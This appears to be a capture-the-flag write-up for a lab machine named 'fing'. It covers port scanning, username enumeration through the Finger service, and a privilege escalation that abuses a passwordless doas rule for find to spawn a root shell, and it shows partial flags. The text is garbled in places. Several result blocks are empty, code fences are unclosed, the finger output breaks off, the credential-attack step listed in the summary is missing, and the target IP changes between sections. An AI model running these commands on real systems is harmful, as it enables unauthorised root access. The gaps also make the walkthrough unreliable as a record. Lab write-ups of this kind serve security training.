### Key Vulnerabilities

  - Finger Service User Enumeration
  - Weak SSH Credentials
  - Misconfigured `doas` Permissions
  - Privilege Escalation via `find`

## 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

### Result

```text

## 🔎 Enumeration

### Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sSV -p- --min-rate 5000 192.168.29.93
```

### Scan Results

```bash
$ nmap -n -Pn -sVS  -p- --min-rate 5000  192.168.29.93

```

#### Findings
- Port **22** → SSH
- Port **79** → Finger Service
- Port **80** → HTTP

The Finger service appeared particularly interesting because it can sometimes allow user enumeration.

## 🔍 User Enumeration via Finger Service

Use the `finger-user-enum` script from PentestMonkey to enumerate usernames through the Finger service.

```bash
./finger-user-enum.pl -U users.txt -t 192.168.29.93
```

### Result

```text
$ ./finger-user-enum.pl -U users.txt -t 10.229.52.4  
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

## 🔍 SUID Enumeration

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Result

```text
adam@fing:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/doas
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

#### Important Finding
The `/usr/bin/doas` binary appeared particularly interesting.

---

## ⚠️ Doas Configuration Analysis

Check the `doas` configuration file:

```bash
cat /etc/doas.conf
```

### Result

```text
adam@fing:~$ cat /etc/doas.conf 
permit nopass keepenv adam as root cmd /usr/bin/find
```

#### Explanation
The configuration allows user `adam` to execute `/usr/bin/find` as root without a password.

---

## 🚀 Privilege Escalation

Use `doas` with `find` to spawn a root shell:

```bash
doas -u root /usr/bin/find . -exec /bin/sh \;
```

### Result

```text
adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh \;
# 
```

Successfully obtained a root shell.

---

## 🔧 Upgrading to Interactive Shell

Spawn a fully interactive shell:

```bash
script /dev/null -c bash
```

---

## 👑 Verification

Check the current user:

```bash
id ; whoami ; hostname
```

### Result

```bash
root@fing:/home/adam# id ; whoami ; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
fing
```

Successfully escalated privileges to root.

---

## 🏁 Flags

### Locate Flags

```bash
find / -type f -name root.txt -o -name user.txt 2>/dev/null
```

### Result

```text
root@fing:~# find / -type f -name root.txt -o -name user.txt 2</dev/null
/root/root.txt
/home/fing/user.txt
```

---

## 📄 User Flag

```bash
cat /home/fing/user.txt
```

```text
ff18a9aca2d1dac41a5c26**********
```

---

## 👑 Root Flag

```bash
cat /root/root.txt
```

```text
1edf2dfe68c6745e93affa**********
```

### 🔍 About `doas`

`doas` is a lightweight privilege escalation utility originally developed for OpenBSD as an alternative to `sudo`. It allows specific users to execute commands as another user, usually `root`, based on rules defined in the `/etc/doas.conf` configuration file.

Unlike `sudo`, `doas` is designed to be simpler and easier to configure while still providing controlled privilege escalation capabilities.

In this machine, the configuration file contained the following rule:

```text
permit nopass keepenv adam as root cmd /usr/bin/find
```

### Explanation
- `permit` → Allows command execution  
- `nopass` → No password required  
- `keepenv` → Preserves environment variables  
- `adam as root` → User `adam` can run commands as `root`  
- `cmd /usr/bin/find` → Only the `find` command is permitted  

Since the `find` binary supports command execution through the `-exec` option, it can be abused to spawn a root shell.

This misconfiguration allowed direct privilege escalation to the root user.

## 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| User Enumeration | Finger Service |
| Credential Attack | Hydra |
| Initial Access | SSH |
| Privilege Escalation | Misconfigured `doas` |
| Root Access | `find` Exploitation |

---



## 🚀 Key Takeaways

- The Finger service can leak valid usernames.
- Weak SSH passwords remain a critical security risk.
- Always enumerate SUID binaries during privilege escalation.
- Misconfigured `doas` rules can directly lead to root access.
- GTFOBins techniques are highly effective during post-exploitation.
